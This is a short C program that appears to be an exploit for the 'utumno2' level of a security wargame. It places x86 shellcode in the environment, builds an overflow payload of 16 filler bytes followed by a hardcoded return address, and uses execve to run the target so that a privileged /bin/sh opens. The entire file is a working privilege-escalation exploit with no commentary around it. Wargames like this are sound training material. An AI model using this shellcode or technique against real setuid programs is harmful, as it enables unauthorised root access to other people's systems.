#include<stdio.h>
#include<unistd.h>

#define PATH "/utumno/utumno2"
#define POSISTION 16

#define SHELLCODE "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x89\xd9\x6a\x46\x58\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x01\x58\xcd\x80"

int main() {
    char payload[POSISTION+4];
    int value = 0xffffdf87;

    for(int i=0;i<POSISTION;i++)
        payload[i] = 'A';

    *((int*)(payload + POSISTION)) = value;

    // Print the payload as a hex dump
    for (int i = 0; i < POSISTION+4; i++) {
        printf("\\x%02x", (unsigned char)payload[i]);
    }
    printf("\n");
    char *args[] = {NULL};
    char *envp[] = {"1","2","3","4","5","6","7",SHELLCODE,payload,NULL};
    execve(PATH, args, envp);
    return 0;
}
